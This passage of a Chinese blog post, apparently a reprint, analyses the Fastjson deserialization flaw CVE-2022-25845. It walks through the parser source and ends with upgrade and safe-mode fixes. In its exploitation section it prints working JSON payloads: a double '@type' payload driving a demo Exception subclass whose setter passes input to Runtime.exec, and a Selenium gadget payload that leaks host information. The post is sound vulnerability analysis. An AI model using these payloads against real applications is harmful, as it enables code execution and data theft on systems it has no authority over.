class="keyword">if</span> (expectHash == <span class="number">0x90a25f5baa21529eL</span></span><br><span class="line">                    || expectHash == <span class="number">0x2d10a5801b9d6136L</span></span><br><span class="line">                    || expectHash == <span class="number">0xaf586a571e302c6bL</span></span><br><span class="line">                    || expectHash == <span class="number">0xed007300a7b227c6L</span></span><br><span class="line">                    || expectHash == <span class="number">0x295c4605fd1eaa95L</span></span><br><span class="line">                    || expectHash == <span class="number">0x47ef269aadc650b4L</span></span><br><span class="line">                    || expectHash == <span class="number">0x6439c4dff712ae8bL</span></span><br><span class="line">                    || expectHash == <span class="number">0xe3dd9875a2dc5283L</span></span><br><span class="line">                    || expectHash == <span class="number">0xe2a8ddba03e69e0dL</span></span><br><span class="line">                    || expectHash == <span class="number">0xd734ceb4c3e9d1daL</span></span><br><span class="line">            ) &#123;</span><br><span class="line">                expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                expectClassFlag = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这些被Ban的类是以下这些：</p>
+<ul>
+<li>java.lang.Object</li>
+<li>java.io.Serializable</li>
+<li>java.lang.Cloneable</li>
+<li>java.lang.Runnable</li>
+<li>java.lang.AutoCloseable</li>
+<li>java.io.Closeable</li>
+<li>java.lang.Iterable</li>
+<li>java.util.Collection</li>
+<li>java.lang.Readable</li>
+<li>java.util.EventListener</li>
+</ul>
+<p>你也可以在 fastjson-blacklist 查看到更多被列入黑名单的类。这个仓库维护了被列入Fastjson黑名单的类的hash值。</p>
+<p>最后，代码将尝试找到一个反序列化器deserializer，用来对这个已经被JSON序列化的类进行反序列化。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> config.getDeserializer(clazz);</span><br><span class="line"><span class="type">Class</span> <span class="variable">deserClass</span> <span class="operator">=</span> deserializer.getClass();</span><br><span class="line"><span class="keyword">if</span> (JavaBeanDeserializer.class.isAssignableFrom(deserClass)</span><br><span class="line">    &amp;&amp; deserClass != JavaBeanDeserializer.class</span><br><span class="line">    &amp;&amp; deserClass != ThrowableDeserializer.class) &#123;</span><br><span class="line">    <span class="built_in">this</span>.setResolveStatus(NONE);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (deserializer <span class="keyword">instanceof</span> MapDeserializer) &#123;</span><br><span class="line">    <span class="built_in">this</span>.setResolveStatus(NONE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在 ParserConfig.getDeserializer()内部，有一个关键检查，用于验证目标类是否继承了 Throwable 类：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Throwable.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">    deserializer = <span class="keyword">new</span> <span class="title class_">ThrowableDeserializer</span>(<span class="built_in">this</span>, clazz);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>ThrowableDeserializer.deserialize()会处理这种数据。如果存在“@type”，它将使用 autoTypeCheck()检查并继续正常反序列化：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (JSON.DEFAULT_TYPE_KEY.equals(key)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exClassName</span> <span class="operator">=</span> lexer.stringVal();</span><br><span class="line">        exClass = parser.getConfig().checkAutoType(exClassName, Throwable.class, lexer.getFeatures());</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>因此，漏洞的核心在于 ，只要目标类继承自 Throwable 类，Fastjson便可以反序列化为任意类！</p>
+<p>在这种情况下，负责创建反序列化类的函数是 createException()，它处理了 3 种不同类型的构造函数。一个没有任何参数，一个带有异常消息的参数，一个带有异常消息和异常原因参数。在此之后，它将先尝试调用更为复杂的构造函数（causeConstructor、messageConstructor 和 defaultConstructor）：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Throwable <span class="title function_">createException</span><span class="params">(String message, Throwable cause, Class&lt;?&gt; exClass)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Constructor&lt;?&gt; defaultConstructor = <span class="literal">null</span>;</span><br><span class="line">        Constructor&lt;?&gt; messageConstructor = <span class="literal">null</span>;</span><br><span class="line">        Constructor&lt;?&gt; causeConstructor = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (Constructor&lt;?&gt; constructor : exClass.getConstructors()) &#123;</span><br><span class="line">            Class&lt;?&gt;[] types = constructor.getParameterTypes();</span><br><span class="line">            <span class="keyword">if</span> (types.length == <span class="number">0</span>) &#123;</span><br><span class="line">                defaultConstructor = constructor;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (types.length == <span class="number">1</span> &amp;&amp; types[<span class="number">0</span>] == String.class) &#123;</span><br><span class="line">                messageConstructor = constructor;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (types.length == <span class="number">2</span> &amp;&amp; types[<span class="number">0</span>] == String.class &amp;&amp; types[<span class="number">1</span>] == Throwable.class) &#123;</span><br><span class="line">                causeConstructor = constructor;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (causeConstructor != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (Throwable) causeConstructor.newInstance(message, cause);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (messageConstructor != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (Throwable) messageConstructor.newInstance(message);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (defaultConstructor != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (Throwable) defaultConstructor.newInstance();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>作为类实例化的一步，还会为每个相关成员变量调用一个 setter方法：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (otherValues != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">JavaBeanDeserializer</span> <span class="variable">exBeanDeser</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (exClass != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (exClass == clazz) &#123;</span><br><span class="line">            exBeanDeser = <span class="built_in">this</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">ObjectDeserializer</span> <span class="variable">exDeser</span> <span class="operator">=</span> parser.getConfig().getDeserializer(exClass);</span><br><span class="line">            <span class="keyword">if</span> (exDeser <span class="keyword">instanceof</span> JavaBeanDeserializer) &#123;</span><br><span class="line">                exBeanDeser = (JavaBeanDeserializer) exDeser;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (exBeanDeser != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; entry : otherValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> entry.getValue();</span><br><span class="line"></span><br><span class="line">            <span class="type">FieldDeserializer</span> <span class="variable">fieldDeserializer</span> <span class="operator">=</span> exBeanDeser.getFieldDeserializer(key);</span><br><span class="line">            <span class="keyword">if</span> (fieldDeserializer != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">FieldInfo</span> <span class="variable">fieldInfo</span> <span class="operator">=</span> fieldDeserializer.fieldInfo;</span><br><span class="line">                <span class="keyword">if</span> (!fieldInfo.fieldClass.isInstance(value)) &#123;</span><br><span class="line">                    value = TypeUtils.cast(value, fieldInfo.fieldType, parser.getConfig());</span><br><span class="line">                &#125;</span><br><span class="line">                fieldDeserializer.setValue(ex, value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2><span id="怎么利用-cve-2022-25845-漏洞">怎么利用 CVE-2022-25845 漏洞？</span></h2><blockquote>
+<p>在了解了AutoType 机制中的上述“漏洞”之后，让我们看看一个在现实中利用这个漏洞的可行性。这个漏洞据称可以实现远程代码执行。</p>
+<p>由 YoungBear 发布的漏洞利用方案，通过传入这个JSON可以运行任意系统操作命令。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.example.fastjson.poc20220523.Poc20220523&quot;</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;calc&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这个漏洞利用方案依赖于在 Java 应用程序中定义的下面这个继承Exception的类：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.fastjson.poc20220523;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> youngbear</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@email</span> youngbear@aliyun.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2022/5/29 8:28</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@blog</span> https://blog.csdn.net/next_second</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/YoungBear</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span> POC类：需要代码中有该类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc20220523</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>当反序列化执行到上面这一段JSON时，Poc20220523这个类就创建了，并且提供name参数是通过自动调用setter方法。</p>
+<p>如代码所示，这将最终调用包含 str &#x3D; “calc”的恶意 setName() setter 函数：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String str)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Runtime.getRuntime().exec(str);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这部分的实际代码内容为打开windows计算器：</p>
+<p><img src="/2022/08/03/CVE-2022-25845-Fastjson/2.png" alt="image" title="计算器弹窗"></p>
+<p>这个漏洞利用方案显然只是一个演示，因为任何正常的 Java 应用程序都不会包含类似于 Poc20220523 这样会基于外部参数运行 shell 命令的异常派生类。</p>
+<p>现在亟待解决的问题是 — 是否有大家熟知的 Java“gadget”类可以作为此漏洞的一部分被滥用？即继承自Exception或Throwable，并且存在相关的构造函数或者setter方法，可能会造成实际安全影响的Java类。</p>
+<p>目前，有一个兼容的gadget类（来自 Selenium 库）已经在被发布了。它会导致非常低影响的数据泄漏：</p>
+</blockquote>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Exception&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.openqa.selenium.WebDriverException&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;y&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$x.systemInformation&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>反序列化这个 JSON 最终会创建一个 HashMap，其中“y”值为有关机器的一些基本信息：</p>
+</blockquote>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;System info: host: &#x27;&#x27;, ip: &#x27;&#x27;, os.name: &#x27;&#x27;, os.arch: &#x27;&#x27;, os.version: &#x27;&#x27;, java.version: &#x27;&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>根据应用程序的不同，这些信息最终可能会被存储或发送给攻击者（例如，它可能被写入可远程访问日志）。</p>
+<p>在检查了 ysoserial 等其他知名来源后，我们没有发现任何可以在实际场景中能够导致远程代码执行的gadget类。因此，想要利用这个漏洞进行实际攻击的黑客，需要对被共计的Java应用服务器进行深入研究，以找到一个加载在Classpath中的自定义的Java gadget类。这个类继承自Exception&#x2F;Throwable，并包含可用于获取权限、泄漏数据甚至运行任意代码的相关方法。</p>
+<p>总而言之，我们评估目前这个漏洞似乎并未构成很高风险的威胁。尽管存在一个潜在影响巨大（远程代码执行）的公共PoC漏洞可利用，并且攻击的条件并不是甚微（将不受信任的输入数据传递给特定易受攻击的 API）。最重要的是，必须找到一个合适的gadget类（或许由于一些不太可能的属性根本不存在）来突破特定被攻击的目标。</p>
+</blockquote>
+<h2><span id="如何完全修复-cve-2022-25845">如何完全修复 CVE-2022-25845？</span></h2><blockquote>
+<p>要完全修复 CVE-2022-25845，我们建议将 Fastjson 升级到最新版本，目前为 1.2.83。</p>
+</blockquote>
+<h2><span id="如何降低-cve-2022-25845-风险">如何降低 CVE-2022-25845 风险？</span></h2><blockquote>
+<p>启用 Fastjson 的“Safe Mode”可以减缓这个漏洞风险。</p>
+<p>可以通过执行以下任何一种操作来开启Safe Mode：</p>
+<p>1.通过代码配置 ParserConfig.getGlobalInstance().setSafeMode(true);<br>2.通过JVM启动参数配置 -Dfastjson.parser.safeMode&#x3D;true<br>3.通过Fastjson的配置文件配置项 fastjson.parser.safeMode&#x3D;true</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Fastjson/" rel="tag">Fastjson</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+</section>
+
+
+  <nav id="page-nav" class="clearfix">
+    
+    <a class="prev" rel="prev" href="/tags/RCE/page/2/">
+      <span class="icon icon-chevron-left"></span>
+      <span class="text">Previous</span>
+    </a>
+    
+    
+  </nav>
+
+        <script>setLoadingBarProgress(60);</script>
+    </main>
+
+    <footer id="footer" class="clearfix">
+
+    
+
+    <div class="social-wrapper">
+        
+            
+                <a href="https://github.com/artchen" class="social github"
+                   target="_blank" rel="external">
+                    <span class="icon icon-github"></span>
+                </a>
+            
+                <a href="/atom.xml" class="social rss"
+                   target="_blank" rel="external">
+                    <span class="icon icon-rss"></span>
+                </a>
+            
+        
+    </div>
+
+    <div class="theme-by">Theme <span class="codename">Memory</span> designed by <a href="https://artifact.me/"
+                                                                                    target="_blank">Art Chen</a>.
+    </div>
+    <div>&copy; <a href="/">氕氘氚</a></div>
+
+</footer>
+
+
+    <script>setLoadingBarProgress(80);</script>
+    <div class="overlay"></div>
+</div>
+
+<div class="site-sidebar" id="site-sidebar">
+
+    
+
+    <div class="sidebar-switch clearfix "
+         style="display: none">
+        <a class="dark-btn active" data-toggle="toc">
+            <span class="icon icon-list"></span>
+            <span class="text">Index</span>
+        </a>
+        <a class="dark-btn" data-toggle="bio">
+            <span class="icon icon-person"></span>
+            <span class="text">Bio</span>
+        </a>
+    </div>
+
+    <div class="site-toc "
+         style="display: none">
+        
+            <div class="no-index">No Index</div>
+        
+    </div>
+
+    <div class="site-bio show"
+         style="display: block">
+
+        <div class="about-me clearfix">
+            <div class="avatar">
+                <img src="/img/avatar.png"/>
+            </div>
+            <div class="info">
+                <a class="name dark-btn" href="/about">
+                    Szczecin
+                </a>
+            </div>
+            <div class="info">
+                <span class="item desc">
+                    Open your eyes to see the light in life
+                </span>
+            </div>
+        </div>
+
+        <div class="menu section">
+            <ul class="clearfix">
+                
+                    <li class="left">
+                        <a href="/about"
+                           onfocus="this.blur();"
+                           class="nav-about dark-btn block">
+                            简介
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/archives"
+                           onfocus="this.blur();"
+                           class="nav-archives dark-btn block">
+                            归档
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/categories"
+                           onfocus="this.blur();"
+                           class="nav-categories dark-btn block">
+                            分类
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/tags"
+                           onfocus="this.blur();"
+                           class="nav-tags dark-btn block">
+                            TAGs
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/WriteUP"
+                           onfocus="this.blur();"
+                           class="nav-WriteUP dark-btn block">
+                            WriteUP
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/EXP"
+                           onfocus="this.blur();"
+                           class="nav-EXP dark-btn block">
+                            EXP
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/SRC"
+                           onfocus="this.blur();"
+                           class="nav-SRC dark-btn block">
+                            SRC
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/Life"
+                           onfocus="this.blur();"
+                           class="nav-Life dark-btn block">
+                            Life
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+
+    </div>
+
+    <div class="shortcuts">
+        <a href="#header" class="top window-nav dark-btn" id="go-top">
+            <span class="icon icon-chevron-thin-up"></span>
+        </a>
+        <a class="close dark-btn" id="sidebar-close">
+            <span class="icon icon-close"></span>
+        </a>
+        <a href="#footer" class="top window-nav dark-btn" id="go-bottom">
+            <span class="icon icon-chevron-thin-down"></span>
+        </a>
+    </div>
+
+</div>
+
+
+
+
+
+<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+<script>window.jQuery || document.write('<script src="/js/jquery.min.js"><\/script>')</script>
+
+
+<script src="/js/jquery.fitvids.js"></script>
+
+<script>
+  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
+  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
+  var ALGOLIA_API_KEY = "";
+  var ALGOLIA_APP_ID = "";
+  var ALGOLIA_INDEX_NAME = "";
+  var AZURE_SERVICE_NAME = "";
+  var AZURE_INDEX_NAME = "";
+  var AZURE_QUERY_KEY = "";
+  var SEARCH_SERVICE = "";
+  var universalSearchConfig = {};
+  if (SEARCH_SERVICE === 'google') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
+      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'algolia') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: ALGOLIA_API_KEY,
+      appId: ALGOLIA_APP_ID,
+      indexName: ALGOLIA_INDEX_NAME,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'azure') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      serviceName: AZURE_SERVICE_NAME,
+      indexName: AZURE_INDEX_NAME,
+      apiKey: AZURE_QUERY_KEY,
+      imagePath: "/img/"
+    };
+  }
+</script>
+
+<script src="/js/app.js"></script>
+
+
+<script src="/js/search.js"></script>
+
+
+
+
+
+<script>setLoadingBarProgress(100);</script>
+
+</body>
+</html>
